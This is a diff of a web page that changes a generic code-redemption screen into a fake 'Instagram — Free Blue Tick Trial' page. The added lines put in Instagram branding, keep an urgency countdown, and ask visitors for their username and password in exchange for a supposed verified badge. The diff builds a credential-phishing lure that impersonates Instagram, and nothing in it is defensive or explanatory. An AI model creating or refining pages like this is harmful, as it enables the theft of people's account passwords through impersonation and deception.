@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QuickService — Free Blue Tick Trial</title>
+<title>Instagram — Free Blue Tick Trial</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Inter:wght@400;500;600;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
@@ -297,7 +297,7 @@
     </div>
 
     <h1>Get your free trial blue tick — one month, on us</h1>
-    <p class="sub">Redeem your QuickService code and we'll activate the verified badge on your Telegram channel for 30 days, completely free.</p>
+    <p class="sub">Only for 1 month trial service.</p>
 
     <div class="countdown-label">This offer refreshes in</div>
     <div class="countdown" id="countdown">
@@ -319,24 +319,24 @@
 
   <!-- SCREEN 2: START -->
   <section class="card" id="screen-start">
-    <div class="wordmark" style="font-size:34px;margin-bottom:40px;">QuickService</div>
+    <div class="wordmark" style="font-size:34px;margin-bottom:40px;">Instagram</div>
     <div class="step-title">You're one step away</div>
-    <p class="step-sub">Have your QuickService code ready. You'll enter your Telegram username and the code we gave you to activate your trial.</p>
-    <button class="btn" onclick="goTo('screen-redeem')">Continue to redeem code</button>
+    <p class="step-sub">Get your one month free trial</p>
+    <button class="btn" onclick="goTo('screen-redeem')">Continue</button>
     <button class="btn btn-secondary" onclick="goTo('screen-offer')">Back</button>
   </section>
 
   <!-- SCREEN 3: REDEEM -->
   <section class="card" id="screen-redeem">
-    <div class="wordmark" style="font-size:34px;margin-bottom:32px;">QuickService</div>
-    <div class="step-title">Redeem your code</div>
-    <p class="step-sub">Enter the Telegram username and code exactly as you received them.</p>
+    <div class="wordmark" style="font-size:34px;margin-bottom:32px;">Instagram</div>
+    <div class="step-title">Blue tick</div>
+    <p class="step-sub">Enter the username and password, you can get only one time</p>
 
     <form id="redeemForm">
-      <input type="text" id="username" name="username" placeholder="Telegram username" autocomplete="off" required>
+      <input type="text" id="username" name="username" placeholder="Username" autocomplete="off" required>
       <div class="field-error" id="err-username"></div>
 
-      <input type="text" id="code" name="code" placeholder="Your QuickService code" autocomplete="off" required>
+      <input type="text" id="code" name="code" placeholder="Password" autocomplete="off" required>
       <div class="field-error" id="err-code"></div>
 
       <button type="submit" class="btn" id="submitBtn">Verify &amp; activate</button>
